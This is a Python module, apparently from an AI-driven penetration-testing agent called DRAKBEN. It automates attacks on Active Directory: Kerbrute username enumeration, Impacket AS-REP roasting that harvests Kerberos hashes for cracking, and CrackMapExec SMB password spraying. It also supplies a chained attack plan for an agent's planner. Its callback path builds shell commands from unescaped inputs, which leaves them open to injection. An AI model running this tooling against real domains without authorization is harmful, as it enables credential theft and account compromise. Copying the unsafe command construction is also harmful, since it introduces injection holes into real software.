# modules/ad_attacks.py
# DRAKBEN Active Directory Attack Module
# Focused on: Kerbrute (User Enum/Brute Force) & Impacket (SMB/DCOM/ASREPRoast)

import logging
import subprocess
import time
from typing import Dict, List, Any, Optional

logger = logging.getLogger(__name__)


class ActiveDirectoryAttacker:
    """
    Manages Active Directory attacks using standard tools (Kerbrute, Impacket).
    Integrates with AgentState for context-aware attacks.
    """

    def __init__(self, executor_callback=None):
        self.executor_callback = executor_callback  # Function to execute shell commands
        self.wordlists_path = "/usr/share/wordlists"  # Default Kali path

    def run_kerbrute_userenum(
            self, domain: str, dc_ip: str, user_list: str = "users.txt") -> Dict[str, Any]:
        """
        Enumerates valid AD users using Kerbrute (Stealthier than LDAP/SMB).
        """
        logger.info(f"Starting Kerbrute User Enum: {domain} @ {dc_ip}")

        # Tool check handled by SelfHealer/Planner ideally, but defensive check
        # here
        cmd = f"kerbrute userenum -d {domain} --dc {dc_ip} {user_list} --safe"

        # Execute via callback if provided (to use agent's executor), else
        # subprocess
        if self.executor_callback:
            result = self.executor_callback(cmd, timeout=300)
            output = result.stdout + result.stderr
            return self._parse_kerbrute(output)
            
        else:
            # Standalone execution
            try:
                cmd_list = ["kerbrute", "userenum", "-d", str(domain), "--dc", str(dc_ip), str(user_list), "--safe"]
                res = subprocess.run(
                    cmd_list,
                    shell=False,
                    capture_output=True,
                    text=True,
                    timeout=300)
                return self._parse_kerbrute(res.stdout + res.stderr)
            except Exception as e:
                logger.error(f"Kerbrute failed: {e}")
                return {"success": False, "error": str(e)}

    def _parse_kerbrute(self, output: str) -> Dict[str, Any]:
        """Parse kerbrute valid usernames"""
        valid_users = []
        for line in output.splitlines():
            if "[+]" in line and "VALID USERNAME" in line:
                # Format: [+] VALID USERNAME:   jdoe
                parts = line.split(":")
                if len(parts) >= 2:
                    valid_users.append(parts[-1].strip())

        return {
            "tool": "kerbrute",
            "success": len(valid_users) > 0,
            "valid_users": valid_users,
            "count": len(valid_users)
        }

    def run_asreproast(self, domain: str, dc_ip: str,
                       user_file: Optional[str] = None) -> Dict[str, Any]:
        """
        Attempts AS-REP Roasting via Impacket (GetNPUsers.py).
        Target keys: Users with 'Do not require Kerberos preauthentication' set.
        """
        logger.info(f"Starting AS-REP Roasting: {domain}")

        # Check standard impacket path
        cmd = f"impacket-GetNPUsers {domain}/ -no-pass -dc-ip {dc_ip} -format hashcat"
        if user_file:
            cmd += f" -usersfile {user_file}"

        if self.executor_callback:
            result = self.executor_callback(cmd, timeout=120)
            output = result.stdout + result.stderr
        else:
            # Fallback
            cmd_list = ["impacket-GetNPUsers", f"{domain}/", "-no-pass", "-dc-ip", str(dc_ip), "-format", "hashcat"]
            if user_file:
                cmd_list.extend(["-usersfile", str(user_file)])
            
            res = subprocess.run(
                cmd_list, shell=False, capture_output=True, text=True)
            output = res.stdout + res.stderr

        # Parse hashes
        hashes = []
        for line in output.splitlines():
            if "$krb5asrep$" in line:
                hashes.append(line.strip())

        return {
            "tool": "asreproast",
            "success": len(hashes) > 0,
            "hashes": hashes,
            "count": len(hashes)
        }

    def run_smb_spray(self, domain: str, target_ip: str,
                      user_file: str, password: str) -> Dict[str, Any]:
        """
        Password Spraying via CrackMapExec / NetExec (SMB).
        """
        logger.info(f"Starting SMB Spray on {target_ip}")
        # Using netexec (nxc) as modern replacement for crackmapexec if
        # available, else cme
        tool = "crackmapexec"  # Default

        cmd = f"{tool} smb {target_ip} -u {user_file} -p '{password}' -d {domain} --continue-on-success"

        if self.executor_callback:
            result = self.executor_callback(cmd, timeout=300)
            output = result.stdout
        else:
            cmd_list = [tool, "smb", str(target_ip), "-u", str(user_file), "-p", str(password), "-d", str(domain), "--continue-on-success"]
            res = subprocess.run(
                cmd_list, shell=False, capture_output=True, text=True)
            output = res.stdout

        success_logins = []
        for line in output.splitlines():
            if "[+]" in line:
                success_logins.append(line)

        return {
            "tool": tool,
            "success": len(success_logins) > 0,
            "logins": success_logins
        }

    # Integration Helper
    def get_attack_plan(self, domain: str, dc_ip: str) -> List[Dict]:
        """
        Returns a standard AD attack plan for the Planner module
        """
        return [
            {
                "action": "ad_user_enum",
                "tool": "kerbrute",
                "target": domain,
                "params": {"dc_ip": dc_ip}
            },
            {
                "action": "ad_asreproast",
                "tool": "impacket",
                "target": domain,
                "depends_on": ["ad_user_enum"],
                "params": {"dc_ip": dc_ip}
            }
        ]
